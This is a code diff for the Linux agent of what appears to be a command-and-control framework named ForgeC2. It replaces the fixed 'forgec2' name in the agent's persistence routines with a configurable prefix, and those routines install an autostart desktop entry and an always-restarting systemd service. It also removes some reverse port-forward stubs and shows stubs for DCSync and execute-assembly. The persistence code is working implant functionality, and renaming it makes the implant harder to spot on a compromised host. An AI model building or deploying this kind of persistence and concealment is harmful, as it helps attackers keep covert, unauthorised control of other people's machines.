@@ -127,13 +127,13 @@ func addPersistenceLinux() {
 	}
 	desktop := fmt.Sprintf(`[Desktop Entry]
 Type=Application
-Name=ForgeC2
+Name=%s
 Exec=%s
 Hidden=false
 NoDisplay=false
 X-GNOME-Autostart-enabled=true
-`, absExe)
-	desktopPath := filepath.Join(autostartDir, "forgec2.desktop")
+`, sanitizeLabel(persistencePrefix), absExe)
+	desktopPath := filepath.Join(autostartDir, sanitizeLabel(persistencePrefix)+".desktop")
 	if err := os.WriteFile(desktopPath, []byte(desktop), 0644); err != nil {
 		if Debug {
 			fmt.Printf("[!] persistence: write desktop file failed: %v\n", err)
@@ -169,7 +169,7 @@ func removePersistenceLinux() {
 	// Remove autostart desktop file
 	home := os.Getenv("HOME")
 	if home != "" {
-		desktopPath := filepath.Join(home, ".config", "autostart", "forgec2.desktop")
+		desktopPath := filepath.Join(home, ".config", "autostart", sanitizeLabel(persistencePrefix)+".desktop")
 		os.Remove(desktopPath)
 	}
 }
@@ -950,12 +950,6 @@ func executeAssemblyForkRun(b64Data string) (string, error) {
 	return "", fmt.Errorf("execute-assembly fork&run is Windows-only")
 }
 
-func rportfwdCollectOutbound() []socksFrame     { return nil }
-func rportfwdHandleFrames(frames []socksFrame)  {}
-func rportfwdDial(connID uint64, target string) {}
-func rportfwdWrite(connID uint64, data []byte)  {}
-func rportfwdClose(connID uint64)               {}
-
 func kerberosDCSync(user string) (string, error) {
 	return "", fmt.Errorf("DCSync is Windows-only")
 }
@@ -1260,12 +1254,12 @@ func applyPersistence(method string, args string) string {
 	case "systemd", "service":
 		exe, _ := os.Executable()
 		absExe, _ := filepath.Abs(exe)
-		serviceName := "forgec2"
+		serviceName := sanitizeLabel(persistencePrefix)
 		if args != "" {
 			serviceName = args
 		}
 		serviceUnit := fmt.Sprintf(`[Unit]
-Description=ForgeC2 Agent
+Description=%s Agent
 After=network.target
 
 [Service]
@@ -1274,8 +1268,8 @@ Restart=always
 RestartSec=10
 
 [Install]
-WantedBy=multi-user.target
-`, absExe)
+ WantedBy=multi-user.target
+ `, persistencePrefix, absExe)
 		servicePath := fmt.Sprintf("/etc/systemd/system/%s.service", serviceName)
 		if err := os.WriteFile(servicePath, []byte(serviceUnit), 0644); err != nil {
 			return fmt.Sprintf("persistence: failed to write systemd unit: %v", err)
@@ -1330,7 +1324,7 @@ func listPersistence() string {
 	systemdOut, _ := exec.Command("systemctl", "list-units", "--type=service", "--all", "--no-legend").Output()
 	if len(systemdOut) > 0 {
 		for _, line := range strings.Split(string(systemdOut), "\n") {
-			if strings.Contains(line, "forgec2") || strings.Contains(line, filepath.Base(absExe)) {
+			if strings.Contains(line, persistencePrefix) || strings.Contains(line, strings.ToLower(persistencePrefix)) || strings.Contains(line, filepath.Base(absExe)) {
 				sb.WriteString(fmt.Sprintf("[+] %s\n", line))
 			}
 		}
@@ -1375,7 +1369,7 @@ func removePersistence(method string, args string) string {
 	method = strings.ToLower(strings.TrimSpace(method))
 	switch method {
 	case "systemd", "service":
-		serviceName := "forgec2"
+		serviceName := sanitizeLabel(persistencePrefix)
 		if args != "" {
 			serviceName = args
 		}
